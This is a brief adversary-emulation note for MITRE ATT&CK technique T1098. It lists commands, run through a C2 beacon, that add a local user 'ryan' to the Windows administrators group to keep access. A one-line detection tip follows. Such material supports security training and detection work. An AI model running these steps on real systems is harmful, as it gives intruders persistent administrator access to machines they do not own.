# [Account Manipulation](https://attack.mitre.org/techniques/T1098/)

## Exploit syntax:
1. Get a beacon with administrative privileges.

2. In parrot open a blank text file and paste the following commands into it
    ```sh
    net user /add ryan;
    net localgroup administrators /add ryan;
    ```

3. Save the file with as Pencilvester.ps1 to /tmp

4. Run
	```sh
	sudo chmod +x /tmp/Pencilvester.ps1
	```

5.  In posh, run
    ```sh
	pslo /tmp/Pencilvester.ps1
    ```

## Detection Technique:
* Monitor windows events related to account manipulation